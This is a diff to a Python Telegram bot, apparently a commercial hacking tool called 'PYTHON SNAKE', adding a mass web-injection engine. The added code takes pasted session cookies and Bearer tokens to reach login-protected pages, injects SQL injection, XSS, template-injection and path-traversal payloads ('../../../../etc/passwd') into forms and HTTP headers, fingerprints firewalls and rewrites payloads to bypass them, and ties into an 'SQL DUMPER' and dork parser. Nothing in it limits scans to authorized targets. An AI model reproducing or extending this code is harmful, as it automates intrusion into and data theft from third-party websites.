@@ -71,8 +71,8 @@ BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE"
 ADMIN_IDS = [8999053405]
 ADMIN_USERNAME = "@Bloody_sweet_baby"
 BRAND = "PYTHON SNAKE"
-VERSION = "v2.22.0"
-BUILD = "param-truth"   # feature flags — /ping me dikhte hain
+VERSION = "v2.23.0"
+BUILD = "web-inject"    # feature flags — /ping me dikhte hain
 BUILD_TS = "%s"                  # file load hone ka time (deploy check ke liye)
 KEY_RE = re.compile(r"^SNK-[A-Z0-9]{4}-[A-Z0-9]{4}$")
 
@@ -3241,7 +3241,7 @@ def inj_verdict(family: str, payload: str, status: int, headers: dict, body: str
 
 
 INJ_STYLE = {"SQLi": "💉", "NoSQL": "🍃", "GraphQL": "🕸", "XSS": "🧪", "LFI": "📂",
-             "SSTI": "🧬", "SSRF": "🌐", "OPEN REDIRECT": "↪️"}
+             "SSTI": "🧬", "SSRF": "🌐", "OPEN REDIRECT": "↪️", "STORED XSS": "💾"}
 
 
 def inj_proxy_on() -> bool:
@@ -3496,8 +3496,11 @@ async def inj_scan(urls: list, cat: str = "all", progress=None, uid=None,
         if delay > 0:
             await asyncio.sleep(min(delay, 2.0))
 
+    _sess_h = user_session_headers(uid) if uid else {}
+
     async def _fetch(session, url, px=None, read=65536):
-        kw = {"headers": dict(UA, **{"User-Agent": random.choice(UA_LIST)}),
+        kw = {"headers": _merge_hdrs(dict(UA, **{"User-Agent": random.choice(UA_LIST)}),
+                                     _sess_h),
               "timeout": aiohttp.ClientTimeout(total=max(3.0, float(timeout))),
               "ssl": False, "allow_redirects": False}
         if px:
@@ -3813,6 +3816,641 @@ def inject_all_payloads(urls: list, cat: str = "all") -> list:
     for pl in payloads_for(cat):
         out += inject_targets(urls, pl)
     return _uniq(out)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+#  🧪 v2.23.0 — WEB SCAN ENGINE: POST forms · Header injection · Auth session
+#               · Second-order (stored) · WAF-aware tamper
+#  Pehle sirf GET ?param= test hota tha. Ab wahi pipeline POST forms, headers,
+#  cookie-protected pages aur WAF ke peeche bhi chalta hai — sab asli requests.
+# ═══════════════════════════════════════════════════════════════════════════════
+
+# ── 1) SESSION / AUTH (per user) ─────────────────────────────────────────────
+SESSION_MAX_HDRS = 6
+
+
+def user_session_get(uid) -> dict:
+    rec = USERS.get(str(uid)) or {}
+    s = rec.get("session") or {}
+    return s if isinstance(s, dict) else {}
+
+
+def user_session_headers(uid) -> dict:
+    """Is user ke saved cookie + extra headers (har engine merge karta hai)."""
+    s = user_session_get(uid)
+    out = {}
+    ck = str(s.get("cookie") or "").strip()
+    if ck:
+        out["Cookie"] = ck[:4000]
+    extra = s.get("headers") or {}
+    if isinstance(extra, dict):
+        for k, v in list(extra.items())[:SESSION_MAX_HDRS]:
+            k, v = str(k or "").strip(), str(v or "").strip()
+            if k and v and k.lower() not in ("host", "content-length"):
+                out[k[:40]] = v[:600]
+    return out
+
+
+def user_session_set(uid, cookie: str = "", headers: dict = None) -> dict:
+    rec = USERS.setdefault(str(uid), {})
+    s = rec.get("session") or {}
+    if cookie is not None and str(cookie).strip():
+        s["cookie"] = str(cookie).strip()[:4000]
+    if headers:
+        cur = s.get("headers") or {}
+        for k, v in list(headers.items())[:SESSION_MAX_HDRS]:
+            if k and v:
+                cur[str(k)[:40]] = str(v)[:600]
+        s["headers"] = cur
+    s["ts"] = datetime.now().isoformat(timespec="seconds")
+    s["on"] = 1 if (s.get("cookie") or s.get("headers")) else 0
+    rec["session"] = s
+    jsave("users", USERS)
+    return s
+
+
+def user_session_clear(uid) -> None:
+    rec = USERS.get(str(uid)) or {}
+    rec.pop("session", None)
+    USERS[str(uid)] = rec
+    jsave("users", USERS)
+
+
+def _mask_cookie(ck: str) -> str:
+    """Cookie dikhane layak — values chhoti kar do (screen pe leak na ho)."""
+    out = []
+    for part in str(ck or "").split(";"):
+        part = part.strip()
+        if not part:
+            continue
+        if "=" in part:
+            k, v = part.split("=", 1)
+            out.append("%s=%s" % (k.strip()[:18], (v[:3] + "…") if len(v) > 5 else v))
+        else:
+            out.append(part[:24])
+    return "; ".join(out[:8])
+
+
+def _parse_session_text(text: str) -> tuple:
+    """'Cookie: a=b; c=d' / 'Authorization: Bearer x' → (cookie, headers)."""
+    cookie, headers = "", {}
+    for raw in str(text or "").splitlines():
+        ln = raw.strip()
+        if not ln:
+            continue
+        if ln.lower().startswith("cookie:"):
+            cookie = ln.split(":", 1)[1].strip()
+            continue
+        if ":" in ln and " " not in ln.split(":", 1)[0].strip():
+            k, v = ln.split(":", 1)
+            k, v = k.strip(), v.strip()
+            if k.lower() in ("cookie",):
+                cookie = v
+            elif k and v and k.lower() not in ("host", "content-length"):
+                headers[k[:40]] = v[:600]
+            continue
+        # sirf cookie value diya (PHPSESSID=abc; x=y)
+        if "=" in ln and not cookie:
+            cookie = ln
+    return cookie[:4000], headers
+
+
+def session_card(uid) -> str:
+    s = user_session_get(uid)
+    ck = str(s.get("cookie") or "")
+    hd = s.get("headers") or {}
+    return (H("SESSION / AUTH", "cookie protected pages") + "\n\n"
+            + KV("Status", "✅ ON" if (ck or hd) else "⚪ not set",
+                 "🍪") + "\n"
+            + KV("Cookie", ("<code>%s</code>" % esc(_mask_cookie(ck))) if ck
+               else "<i>none</i>", "🧾") + "\n"
+            + KV("Extra headers", "<code>%d</code>" % len(hd), "📋")
+            + (("\n" + "\n".join("• <code>%s</code>: %s"
+                                 % (esc(k), esc(str(v)[:24] + "…" if len(str(v)) > 24 else v))
+                                 for k, v in list(hd.items())[:SESSION_MAX_HDRS]))
+               if hd else "")
+            + "\n\n" + P("Cookie paste karo (browser → DevTools → Network → Cookie). "
+                         "Phir login-wale pages bhi test / dump ho jayenge.")
+            + "\n" + P("Format: <code>Cookie: PHPSESSID=abc; csrf=xyz</code> "
+                       "ya <code>Authorization: Bearer TOKEN</code>"))
+
+
+def session_kb(uid) -> InlineKeyboardMarkup:
+    s = user_session_get(uid)
+    rows = [[InlineKeyboardButton("✍️ SET / UPDATE", callback_data="inj:session_set")]]
+    if s.get("cookie") or s.get("headers"):
+        rows.append([InlineKeyboardButton("🗑 CLEAR SESSION", callback_data="inj:session_clear")])
+    rows.append([InlineKeyboardButton("⬅️ INJECTOR", callback_data="m:inj")])
+    return RK(rows)
+
+
+async def input_session(update, context, text: str):
+    uid = update.effective_user.id
+    cookie, headers = _parse_session_text(text)
+    if not cookie and not headers:
+        await reply_msg(update).reply_text(
+            "❌ Samajh nahi aaya.\n\nFormat:\n<code>Cookie: PHPSESSID=abc; csrf=xyz</code>\n"
+            "<code>Authorization: Bearer TOKEN</code>", parse_mode=ParseMode.HTML,
+            reply_markup=kb_back("m:inj"))
+        await_set(context, "session_set")
+        return
+    user_session_set(uid, cookie, headers)
+    await reply_msg(update).reply_text(
+        (H("SESSION SAVED", "%d header(s)" % (len(headers) + (1 if cookie else 0)))
+         + "\n\n" + KV("Cookie", ("<code>%s</code>" % esc(_mask_cookie(cookie)))
+                       if cookie else "<i>none</i>", "🍪")
+         + "\n" + KV("Extra", "<code>%s</code>" % ", ".join(list(headers)[:4]) or "—", "📋")
+         + "\n\n" + P("Ab injector / dumper / POST scan sab isi session se chalenge.")),
+        parse_mode=ParseMode.HTML, reply_markup=session_kb(uid))
+    await_clear(context)
+
+
+# ── 2) FORM PARSER (POST injection) ──────────────────────────────────────────
+_FORM_TAG_RE = re.compile(r"<form\b([^>]*)>(.*?)</form>", re.I | re.S)
+_FORM_ATTR_RE = re.compile(r"""(\w+)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))""")
+_FORM_FIELD_RE = re.compile(r"<(input|textarea|select)\b([^>]*)>", re.I | re.S)
+_SKIP_FIELD_TYPES = {"submit", "button", "reset", "image", "file", "checkbox", "radio"}
+
+
+def _attrs_of(raw: str) -> dict:
+    out = {}
+    for m in _FORM_ATTR_RE.finditer(str(raw or "")):
+        k = m.group(1).lower()
+        v = m.group(2) if m.group(2) is not None else (
+            m.group(3) if m.group(3) is not None else (m.group(4) or ""))
+        out.setdefault(k, _html.unescape(v))
+    return out
+
+
+def parse_forms(url: str, body: str, limit: int = 4) -> list:
+    """Page ke ASLI forms — action, method, enctype, fields.
+
+    Sirf wahi forms jinme kam se kam ek text-type field ho (login/search/etc).
+    """
+    out = []
+    if not str(url or "").startswith(("http://", "https://")):
+        return out
+    b = str(body or "")[:600000]
+    for m in _FORM_TAG_RE.finditer(b):
+        if len(out) >= int(limit):
+            break
+        at = _attrs_of(m.group(1))
+        action = at.get("action") or ""
+        method = (at.get("method") or "get").lower()
+        if method not in ("post", "get"):
+            method = "post"
+        try:
+            act_url = urljoin(str(url or ""), action) if action else str(url or "")
+            act_url = _clean_url(act_url) or act_url.split("#")[0]
+        except Exception:
+            act_url = str(url or "")
+        if not act_url.startswith("http"):
+            continue
+        fields = []
+        for fm in _FORM_FIELD_RE.finditer(m.group(2)):
+            tag = fm.group(1).lower()
+            fa = _attrs_of(fm.group(2))
+            name = str(fa.get("name") or fa.get("id") or "").strip()
+            if not name or len(name) > 60:
+                continue
+            typ = (fa.get("type") or ("textarea" if tag == "textarea" else
+                                      "select" if tag == "select" else "text")).lower()
+            if tag == "input" and typ in _SKIP_FIELD_TYPES:
+                continue
+            if any(f["name"] == name for f in fields):
+                continue
+            fields.append({"name": name, "type": typ,
+                           "value": str(fa.get("value") or "")[:200]})
+        if not fields:
+            continue
+        if any(o["action"] == act_url and o["method"] == method for o in out):
+            continue
+        out.append({"action": act_url, "method": method, "fields": fields[:12],
+                    "enctype": (at.get("enctype") or "").lower(),
+                    "page": str(url or "")})
+    return out
+
+
+def form_label(f: dict) -> str:
+    host = urlparse(f.get("action") or "").netloc or "?"
+    names = ",".join(x["name"] for x in (f.get("fields") or [])[:3])
+    return "%s %s (%s)" % ((f.get("method") or "post").upper(), host[:32], names[:40])
+
+
+def _form_payload(f: dict) -> dict:
+    """Form ke current values — baseline POST ke liye."""
+    return {x["name"]: x.get("value", "") for x in (f.get("fields") or [])}
+
+
+# ── 3) WAF DETECTION + TAMPER ────────────────────────────────────────────────
+WAF_SIGNS = {
+    "Cloudflare": ("cloudflare", "cf-ray", "attention required", "__cf_chl",
+                   "cf-chl-", "just a moment"),
+    "Akamai": ("akamai", "reference #", "akamai ghost"),
+    "AWS WAF": ("awswaf", "request blocked", "aws-waf"),
+    "Sucuri": ("sucuri", "sucuriwebsitefirewall", "access denied - sucuri"),
+    "ModSecurity": ("mod_security", "modsecurity", "not acceptable", "406 not acceptable"),
+    "Imperva": ("incapsula", "imperva", "_incap_ses"),
+    "F5 BIG-IP": ("big-ip", "the requested url was rejected", "tsagle"),
+    "Wordfence": ("wordfence", "generated by wordfence"),
+    "DDoS-Guard": ("ddos-guard", "ddos guard"),
+    "Barracuda": ("barracuda", "barra_counter_session"),
+}
+WAF_STATUS = (403, 406, 409, 418, 429, 501, 503)
+
+
+def waf_detect(status: int, headers=None, body: str = "") -> str:
+    """WAF ka naam — status + headers + body signs se (koi guess nahi)."""
+    hd = {str(k).lower(): str(v) for k, v in (headers or {}).items()}
+    blob = (str(body or "")[:60000] + " " + " ".join("%s:%s" % (k, v) for k, v in hd.items())).lower()
+    for name, signs in WAF_SIGNS.items():
+        if any(s in blob for s in signs):
+            return name
+    if int(status or 0) in WAF_STATUS:
+        return "Unknown WAF"
+    return ""
+
+
+TAMPER_MODES = ("comment", "case", "both")
+
+# WAF bypass — keyword ko comment se todna (MySQL/Postgres dono me valid)
+_COMMENT_SPLIT_WORDS = ("select", "union", "information_schema", "group_concat",
+                        "concat", "database", "version", "order", "sleep",
+                        "table_name", "column_name", "limit", "where", "from",
+                        "and", "or")
+
+
+def _split_kw(word: str) -> str:
+    """SELECT → SEL/**/ECT (syntax valid rehta hai, WAF regex tootta hai)."""
+    w = str(word)
+    mid = max(2, len(w) // 2)
+    return w[:mid] + "/**/" + w[mid:]
+
+
+def _mixcase(word: str) -> str:
+    return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(str(word)))
+
+
+def waf_tamper(payload: str, mode: str = "comment") -> str:
+    """WAF bypass shape — payload ka matlab wahi, dikhna alag.
+
+    comment : SE/**/LECT, UN/**/ION, A/**/ND
+    case    : SeLeCt
+    both    : case + comment
+    Trailing comment (-- - / #) ko chhua nahi jata — warna query toot jati hai.
+    """
+    p = str(payload or "")
+    if not p or not mode:
+        return p
+    m = str(mode).lower()
+    if m not in TAMPER_MODES:
+        return p
+    tail = ""
+    mm = re.search(r"(\s*(?:--\s*-?|#)\s*)$", p)
+    if mm:
+        tail = mm.group(0)
+        p = p[:mm.start()]
+    if m in ("case", "both"):
+        for w in _COMMENT_SPLIT_WORDS:
+            p = re.sub(r"\b%s\b" % re.escape(w), lambda x: _mixcase(x.group(0)),
+                       p, flags=re.I)
+    if m in ("comment", "both"):
+        for w in _COMMENT_SPLIT_WORDS:
+            p = re.sub(r"\b%s\b" % re.escape(w), lambda x: _split_kw(x.group(0)),
+                       p, flags=re.I)
+    return p + tail
+
+
+def _waf_modes_for(det: dict) -> list:
+    """WAF mila to kaunse tampers try karne hain (order matter)."""
+    if not det.get("waf"):
+        return [""]
+    return ["", "comment", "case", "both"]
+
+
+# ── 4) HTTP layer (GET/POST + session headers) ────────────────────────────────
+def _merge_hdrs(base: dict, extra: dict) -> dict:
+    out = dict(base or {})
+    for k, v in (extra or {}).items():
+        out[k] = v
+    return out
+
+
+async def _web_req(session, method: str, url: str, timeout: float,
+                   data: dict = None, headers: dict = None, rot=None,
+                   read: int = 200000) -> dict:
+    """Ek asli GET/POST — status/headers/body/err, koi exception bahar nahi."""
+    kw = {"headers": _merge_hdrs(
+              {"User-Agent": random.choice(UA_LIST), "Accept": "*/*"},
+              headers or {}),
+          "timeout": aiohttp.ClientTimeout(total=max(3.0, float(timeout))),
+          "ssl": False, "allow_redirects": True, "max_redirects": 5}
+    if rot is not None and getattr(rot, "enabled", False):
+        px = rot.next()
+        if px:
+            try:
+                pxc, _h, _i, _s = await proxy_connect_url(px)
+                kw["proxy"] = pxc
+            except Exception:
+                pass
+    try:
+        if str(method).upper() == "POST":
+            kw["data"] = data or {}
+            async with session.post(url, **kw) as r:
+                body = await r.text(errors="ignore")
+                return {"status": r.status, "headers": dict(r.headers),
+                        "body": body[:read], "err": ""}
+        async with session.get(url, **kw) as r:
+            body = await r.text(errors="ignore")
+            return {"status": r.status, "headers": dict(r.headers),
+                    "body": body[:read], "err": ""}
+    except Exception as exc:
+        return {"status": 0, "headers": {}, "body": "", "err": str(exc)[:90]}
+
+
+# ── 5) POST FORM SCAN ────────────────────────────────────────────────────────
+POST_PROBES = [("sqli", "'"), ("sqli", "1' AND '1'='2"),
+               ("xss", '"><svg/onload=alert(1)>'),
+               ("ssti", "{{1337*1337}}")]
+
+
+def _post_probes_for(cat: str) -> list:
+    if cat and cat in PAYLOAD_CATS and cat != "all":
+        fam = "sqli" if cat in ("sqli", "union", "blind") else cat
+        return [(fam, pl) for pl in (PAYLOAD_CATS.get(cat) or [])[:6]]
+    return list(POST_PROBES)
+
+
+async def post_scan(urls: list, cat: str = "all", timeout: float = 8.0,
+                    conc: int = 6, progress=None, uid=None,
+                    max_forms: int = 2, max_fields: int = 3,
+                    second_order: bool = True) -> dict:
+    """URLs ke forms me ASLI POST injection — get/action, fields, payloads.
+
+    Har form ka baseline POST (bina payload) liya jata hai, phir ek-ek field me
+    payload daal ke response compare hota hai. Stored (second-order) ke liye
+    form page dobara fetch hota hai.
+    """
+    urls = _uniq([u for u in (urls or []) if str(u).startswith("http")])
+    probes = _post_probes_for(cat)
+    sid = str(uid or "")
+    hdrs = user_session_headers(uid) if uid else {}
+    st = {"urls": len(urls), "done": 0, "forms": 0, "tested": 0, "vulns": [],
+          "safe_urls": [], "vuln_urls": [], "no_form": 0, "blocked": 0,
+          "errors": 0, "waf": "", "start": time.time(), "stopped": 0,
+          "stage": "forms", "mode": "post", "cat": cat,
+          "done_urls": [], "param_forms": 0, "stored": 0,
+          "by_type": {}, "took": 0.0, "second_order": bool(second_order)}
+    if not urls:
+        st["took"] = 0.0
+        return st
+    workers = max(1, min(16, int(conc or 6)))
+    sem = asyncio.Semaphore(workers)
+    lock = asyncio.Lock()
+    conn = mk_connector(limit=max(8, workers * 3), force_close=True)
+    rot = ProxyRotator(enabled=False, uid=uid)
+
+    async def one(session, raw):
+        if uid and stop_requested(uid):
+            async with lock:
+                st["stopped"] = 1
+            return
+        async with sem:
+            page = await _web_req(session, "GET", raw, timeout, headers=hdrs, rot=rot)
+            if not page["status"]:
+                async with lock:
+                    st["errors"] += 1
+                    st["done"] += 1
+                    st["done_urls"].append(raw)
+                return
+            wf = waf_detect(page["status"], page["headers"], page["body"])
+            if wf:
+                async with lock:
+                    st["blocked"] += 1
+                    st["waf"] = st["waf"] or wf
+            forms = parse_forms(raw, page["body"], limit=max_forms)
+            if not forms:
+                async with lock:
+                    st["no_form"] += 1
+                    st["done"] += 1
+                    st["done_urls"].append(raw)
+                return
+            async with lock:
+                st["forms"] += len(forms)
+            found_here = False
+            for f in forms:
+                if uid and stop_requested(uid):
+                    break
+                base_data = _form_payload(f)
+                base = await _web_req(session, f["method"], f["action"], timeout,
+                                      data=base_data if f["method"] == "post" else None,
+                                      headers=hdrs, rot=rot)
+                if not base["status"]:
+                    async with lock:
+                        st["errors"] += 1
+                    continue
+                async with lock:
+                    st["tested"] += 1
+                    st["param_forms"] += 1
+                text_fields = [x for x in f["fields"]
+                               if x["type"] not in _SKIP_FIELD_TYPES][:max_fields]
+                for fld in text_fields:
+                    for fam, pl in probes:
+                        if uid and stop_requested(uid):
+                            break
+                        data = dict(base_data)
+                        data[fld["name"]] = pl
+                        if f["method"] == "post":
+                            r = await _web_req(session, "POST", f["action"], timeout,
+                                               data=data, headers=hdrs, rot=rot)
+                        else:
+                            u2 = inj_build_case(f["action"], fld["name"], pl)
+                            r = await _web_req(session, "GET", u2, timeout,
+                                               headers=hdrs, rot=rot)
+                        async with lock:
+                            st["tested"] += 1
+                        if not r["status"]:
+                            async with lock:
+                                st["errors"] += 1
+                            continue
+                        v = inj_verdict(fam, pl, r["status"], r["headers"], r["body"],
+                                        urlparse(f["action"]).hostname or "",
+                                        base["body"], baseline_ok=bool(base["status"]))
+                        if not v:
+                            continue
+                        # confirm — doosra payload (same family)
+                        pl2 = INJ_CONFIRM.get(fam)
+                        okk = True
+                        if pl2 and pl2 != pl:
+                            d2 = dict(base_data)
+                            d2[fld["name"]] = pl2
+                            if f["method"] == "post":
+                                r2 = await _web_req(session, "POST", f["action"], timeout,
+                                                    data=d2, headers=hdrs, rot=rot)
+                            else:
+                                r2 = await _web_req(session, "GET",
+                                                    inj_build_case(f["action"], fld["name"], pl2),
+                                                    timeout, headers=hdrs, rot=rot)
+                            okk = bool(r2["status"] and inj_verdict(
+                                fam, pl2, r2["status"], r2["headers"], r2["body"],
+                                "", base["body"], baseline_ok=True))
+                        if not okk:
+                            continue
+                        # second-order / stored — form page dobara dekho
+                        stored = False
+                        if second_order and fam == "xss":
+                            back = await _web_req(session, "GET", raw, timeout,
+                                                  headers=hdrs, rot=rot)
+                            if back["status"] and pl and pl in (back["body"] or ""):
+                                stored = True
+                        item = {"base": raw, "url": f["action"], "param": fld["name"],
+                                "payload": pl, "type": ("STORED XSS" if stored else v["type"]),
+                                "dbms": v.get("dbms", ""), "evidence": v.get("evidence", ""),
+                                "status": r["status"], "confirmed": True,
+                                "method": f["method"].upper(), "form": form_label(f),
+                                "stored": stored}
+                        async with lock:
+                            key = (raw, f["action"], fld["name"], item["type"])
+                            if key not in {(x["base"], x["url"], x["param"], x["type"])
+                                           for x in st["vulns"]}:
+                                st["vulns"].append(item)
+                                if stored:
+                                    st["stored"] += 1
+                        found_here = True
+            async with lock:
+                st["done"] += 1
+                st["done_urls"].append(raw)
+                if not found_here:
+                    st["safe_urls"].append(raw)
+                if progress:
+                    try:
+                        await progress(st)
+                    except Exception:
+                        pass
+
+    async with aiohttp.ClientSession(connector=conn) as session:
+        await asyncio.gather(*[one(session, u) for u in urls], return_exceptions=True)
+    if uid and stop_requested(uid):
+        st["stopped"] = 1
+    st["took"] = time.time() - st["start"]
+    st["vuln_urls"] = _uniq([v["base"] for v in st["vulns"]])
+    st["safe_urls"] = [u for u in st["safe_urls"] if u not in set(st["vuln_urls"])]
+    for v in st["vulns"]:
+        st["by_type"][v["type"]] = st["by_type"].get(v["type"], 0) + 1
+    st["speed_urls"] = round(st["done"] / max(0.001, st["took"]), 2)
+    del sid
+    return st
+
+
+# ── 6) HEADER / COOKIE INJECTION ─────────────────────────────────────────────
+HEADER_PROBES = [
+    ("User-Agent", "sqli", "'"),
+    ("Referer", "sqli", "'"),
+    ("X-Forwarded-For", "sqli", "'"),
+    ("X-Forwarded-Host", "xss", '"><svg/onload=alert(1)>'),
+    ("X-Original-URL", "lfi", "../../../../etc/passwd"),
+    ("Cookie", "sqli", "'"),
+]
+HEADER_NAMES = ("User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host",
+                "X-Original-URL", "Cookie")
+
+
+async def header_scan(urls: list, timeout: float = 8.0, conc: int = 8,
+                      progress=None, uid=None) -> dict:
+    """Header / Cookie injection — User-Agent, Referer, XFF, X-Forwarded-Host…"""
+    urls = _uniq([u for u in (urls or []) if str(u).startswith("http")])
+    st = {"urls": len(urls), "done": 0, "tested": 0, "vulns": [], "safe_urls": [],
+          "vuln_urls": [], "blocked": 0, "errors": 0, "waf": "", "start": time.time(),
+          "stopped": 0, "stage": "headers", "mode": "header", "cat": "header",
+          "done_urls": [], "no_form": 0, "forms": 0, "param_forms": 0, "stored": 0,
+          "by_type": {}, "took": 0.0, "second_order": False,
+          "headers_tested": len(HEADER_PROBES)}
+    if not urls:
+        return st
+    sid = user_session_get(uid) if uid else {}
+    del sid
+    base_hdrs = user_session_headers(uid) if uid else {}
+    workers = max(1, min(16, int(conc or 8)))
+    sem = asyncio.Semaphore(workers)
+    lock = asyncio.Lock()
+    conn = mk_connector(limit=max(8, workers * 3), force_close=True)
+
+    async def one(session, raw):
+        if uid and stop_requested(uid):
+            async with lock:
+                st["stopped"] = 1
+            return
+        async with sem:
+            base = await _web_req(session, "GET", raw, timeout, headers=base_hdrs)
+            if not base["status"]:
+                async with lock:
+                    st["errors"] += 1
+                    st["done"] += 1
+                    st["done_urls"].append(raw)
+                return
+            wf = waf_detect(base["status"], base["headers"], base["body"])
+            if wf:
+                async with lock:
+                    st["blocked"] += 1
+                    st["waf"] = st["waf"] or wf
+            host = urlparse(raw).hostname or ""
+            found = False
+            for hname, fam, pl in HEADER_PROBES:
+                if uid and stop_requested(uid):
+                    break
+                hs = dict(base_hdrs)
+                hs[hname] = pl
+                r = await _web_req(session, "GET", raw, timeout, headers=hs)
+                async with lock:
+                    st["tested"] += 1
+                if not r["status"]:
+                    async with lock:
+                        st["errors"] += 1
+                    continue
+                v = inj_verdict(fam, pl, r["status"], r["headers"], r["body"], host,
+                                base["body"], baseline_ok=True)
+                if not v:
+                    continue
+                # confirm
+                pl2 = INJ_CONFIRM.get(fam)
+                if pl2 and pl2 != pl:
+                    hs2 = dict(base_hdrs)
+                    hs2[hname] = pl2
+                    r2 = await _web_req(session, "GET", raw, timeout, headers=hs2)
+                    if not (r2["status"] and inj_verdict(fam, pl2, r2["status"],
+                                                         r2["headers"], r2["body"], host,
+                                                         base["body"], baseline_ok=True)):
+                        continue
+                async with lock:
+                    st["vulns"].append({"base": raw, "url": raw, "param": hname,
+                                        "payload": pl, "type": v["type"],
+                                        "dbms": v.get("dbms", ""),
+                                        "evidence": v.get("evidence", ""),
+                                        "status": r["status"], "confirmed": True,
+                                        "method": "HEADER", "form": hname})
+                found = True
+            async with lock:
+                st["done"] += 1
+                st["done_urls"].append(raw)
+                if not found:
+                    st["safe_urls"].append(raw)
+                if progress:
+                    try:
+                        await progress(st)
+                    except Exception:
+                        pass
+
+    async with aiohttp.ClientSession(connector=conn) as session:
+        await asyncio.gather(*[one(session, u) for u in urls], return_exceptions=True)
+    if uid and stop_requested(uid):
+        st["stopped"] = 1
+    st["took"] = time.time() - st["start"]
+    st["vuln_urls"] = _uniq([v["base"] for v in st["vulns"]])
+    st["safe_urls"] = [u for u in st["safe_urls"] if u not in set(st["vuln_urls"])]
+    for v in st["vulns"]:
+        st["by_type"][v["type"]] = st["by_type"].get(v["type"], 0) + 1
+    st["speed_urls"] = round(st["done"] / max(0.001, st["took"]), 2)
+    return st
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -4772,7 +5410,13 @@ def _clean_url(u: str) -> str:
         if len(u) > 500:
             return ""
         q2 = _strip_track(p.query or "")
-        return "%s://%s%s%s" % (p.scheme or "http", host, p.path,
+        #  v2.23.0: non-standard port kabhi girao mat (localhost:8080, site:8443)
+        try:
+            _port = p.port
+        except Exception:
+            _port = None
+        netloc = host if _port in (None, 80, 443) else "%s:%s" % (host, _port)
+        return "%s://%s%s%s" % (p.scheme or "http", netloc, p.path,
                                 ("?" + q2) if q2 else "")
     except Exception:
         return ""
@@ -6602,7 +7246,8 @@ TASK_CONC = 4                      # poore bot me ek saath kitne tasks
 TASK_SEM = {"s": None}
 BOT_REF = {"app": None}
 TASK_KIND = {"inj": "💉 INJECTOR", "dump": "📥 SQL DUMPER",
-             "parse": "🔍 PARSER", "harvest": "🧲 HARVEST"}
+             "parse": "🔍 PARSER", "harvest": "🧲 HARVEST",
+             "post": "📮 POST SCAN", "header": "🧾 HEADER SCAN"}
 TASK_STATUS_ICON = {"queued": "🕒", "running": "▶️", "done": "✅",
                     "stopped": "⛔", "error": "⚠️", "paused": "⏸"}
 
@@ -6865,6 +7510,8 @@ async def task_run(tid: str) -> None:
             elif kind == "parse":
                 ctx.user_data["parse_dorks"] = items
                 await input_deep_max(upd, ctx, "", task_id=tid)
+            elif kind in ("post", "header"):
+                await _run_webscan(upd, ctx, items, mode=kind, task_id=tid)
             # engine ne khud finish kiya ho (queued/stopped) to chhedo mat
             if (task_get(tid) or {}).get("status") == "running":
                 task_finish(tid, "done")
@@ -7855,6 +8502,28 @@ async def _route_tool_cb(update, context, data: str):
     elif head == "inj":
         if rest == "resume":
             return await cb_inj_resume(update, context)
+        if rest == "post":
+            return await tool_inj_post(update, context)
+        if rest == "post_go":
+            context.user_data["inj_input_mode"] = "post"
+            return await tool_inj_post(update, context)
+        if rest == "post_last":
+            return await cb_inj_mode_last(update, context, "post")
+        if rest == "header":
+            return await tool_inj_header(update, context)
+        if rest == "header_go":
+            context.user_data["inj_input_mode"] = "header"
+            return await tool_inj_header(update, context)
+        if rest == "header_last":
+            return await cb_inj_mode_last(update, context, "header")
+        if rest == "session":
+            return await cb_inj_session(update, context)
+        if rest == "session_set":
+            return await cb_inj_session_set(update, context)
+        if rest == "session_clear":
+            return await cb_inj_session_clear(update, context)
+        if rest == "relast":
+            return await cb_inj_relast(update, context)
         if rest == "uhq":
             return await cb_inj_uhq(update, context)
         if rest == "go":
@@ -9915,6 +10584,12 @@ async def tool_inj(update, context):
                                       callback_data="inj:discover")])
     rows.append([InlineKeyboardButton("📥 LAST PARSER URLS (%d)" % len(context.user_data.get("last_urls") or []),
                                       callback_data="inj:last")])
+    rows.append([InlineKeyboardButton("📮 POST FORMS (login/search)", callback_data="inj:post"),
+                 InlineKeyboardButton("🧾 HEADERS", callback_data="inj:header")])
+    rows.append([InlineKeyboardButton("🍪 SESSION / AUTH%s"
+                                      % (" ✅" if user_session_get(update.effective_user.id)
+                                         else ""),
+                                      callback_data="inj:session")])
     _rs = inj_resume_load()
     if _rs["urls"]:
         rows.append([InlineKeyboardButton("▶️ RESUME (%s URLs left)" % fmt(len(_rs["urls"])),
@@ -9934,6 +10609,10 @@ async def tool_inj(update, context):
                % (fmt(len(PAYLOADS)), len(PAYLOAD_CATS)), "💉") + "\n"
            + KV("DBMS fingerprints", "<code>%s</code> • %d databases"
                % (fmt(DBMS_COUNT), len(DBMS_ERRORS)), "🧬") + "\n"
+           + KV("POST forms", "✅ on — page ke asli forms (login/search)", "📮") + "\n"
+           + KV("Headers", "✅ on — User-Agent · Referer · XFF · Cookie", "🧾") + "\n"
+           + KV("Session", ("✅ cookie set" if user_session_get(update.effective_user.id)
+                            else "⚪ not set — login pages ke liye 🍪"), "🍪") + "\n"
            + KV("Timeout / target", "<code>%ss</code> • max <code>%s</code> tests per URL"
                % (int(sget("inj_timeout", 8) or 8), fmt(int(sget("inj_targets", 24) or 24))), "⏱") + "\n\n"
            + B("How it works") + "\n"
@@ -10038,6 +10717,9 @@ async def input_inj_urls(update, context, text: str):
             reply_markup=kb_back("m:inj"))
         await_set(context, "inj_urls")
         return
+    mode = context.user_data.pop("inj_input_mode", "") or "get"
+    if mode in ("post", "header"):
+        return await _run_webscan(update, context, urls, mode=mode)
     await _run_inject(update, context, urls)
 
 
@@ -10363,6 +11045,293 @@ async def _run_inject(update, context, urls, task_id: str = ""):
                                            ("tested", "total", "urls", "blocked", "took")}
     context.user_data.pop("inj_pending", None)
     await_clear(context)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+#  🧪 v2.23.0 — POST / HEADER / SESSION UI
+# ═══════════════════════════════════════════════════════════════════════════════
+def _webscan_progress(st: dict, spin: int) -> str:
+    mode = st.get("mode", "post")
+    total = max(1, int(st.get("urls", 0) or 0))
+    done = int(st.get("done", 0) or 0)
+    pct = (100.0 * done / total)
+    took = max(0.001, time.time() - float(st.get("start") or time.time()))
+    speed = done / took
+    if mode == "post":
+        line2 = "◆ Forms       : <code>%s</code>\n" % fmt(st.get("forms", 0))
+    else:
+        line2 = "◆ Headers     : <code>%s</code>\n" % fmt(st.get("headers_tested", 0))
